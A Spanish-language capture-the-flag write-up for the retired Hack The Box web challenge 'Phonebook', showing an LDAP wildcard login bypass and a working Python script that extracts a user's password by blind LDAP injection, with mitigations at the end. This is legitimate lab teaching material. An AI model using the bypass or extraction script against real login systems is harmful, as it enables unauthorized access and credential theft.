---
challenge: Phonebook
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, ldap, ldap-injection, blind-injection, auth-bypass]
---

# Phonebook — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de análisis; el flag no se publica.

## Enunciado

Una agenda web con login contra **LDAP**. El flag **no** es entrar: es la contraseña de un usuario concreta.

## Reconocimiento

```bash
gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
```

- `/` es el formulario de login; la lógica consulta un directorio LDAP con el usuario y la contraseña enviados.
- Los errores se muestran en la propia URL: `/?message=Authentication failed`.

## El bypass que no basta

Con `*` en ambos campos, el filtro LDAP casa con cualquier entrada y la aplicación deja pasar:

```text
username: *
password: *
```

Entrar sirve para ver la aplicación, pero **no da el flag**. El objetivo es otro: la contraseña del usuario `reese`, que vive en el directorio.

## Inyección LDAP ciega

El formulario no devuelve datos del directorio, sólo un mensaje distinto según si la consulta tuvo éxito. Eso basta para extraer la contraseña **carácter a carácter**:

```text
username: reese
password: <prefijo>*      # el prefijo del flag, un caracter mas cada vez
```

Si `?message=Authentication failed` desaparece, el prefijo probado es correcto y se avanza con el siguiente carácter (el flag se escribe `HTB` + `{` + caracteres). Probando el juego de caracteres completo (`a-z`, `A-Z`, `0-9`, `_`, `}`) se reconstruye la contraseña entera.

```python
import requests, string

base = "http://<IP>:<PORT>/"
known, alphabet = "HTB" + "{", string.ascii_letters + string.digits + "_{}-"
while not known.endswith("}"):
    for ch in alphabet:
        r = requests.post(base, data={"username": "reese", "password": known + ch + "*"})
        if "Authentication failed" not in r.text:
            known += ch
            print(known)
            break
```

El valor recuperado **es** el flag.

## Conclusiones

- El bypass `*`/`*` es sólo el reconocimiento: confirma que la entrada se concatena en el filtro.
- El flag se obtiene con **inyección LDAP ciega** usando el mensaje de error como oráculo.
- La contraseña estaba en el directorio en claro, reutilizable como credencial.

## Lecciones

- Un login que acepta comodines está concatenando el filtro, no escapándolo.
- En inyección ciega el oráculo es cualquier diferencia observable: aquí, el texto del mensaje.
- Las contraseñas en LDAP no deben guardarse en claro ni ser el dato sensible del reto.
- Mitigación: escapar los metacaracteres LDAP (`*`, `(`, `)`, `\\`), bind con cuenta de servicio y comparación de hash en el servidor.
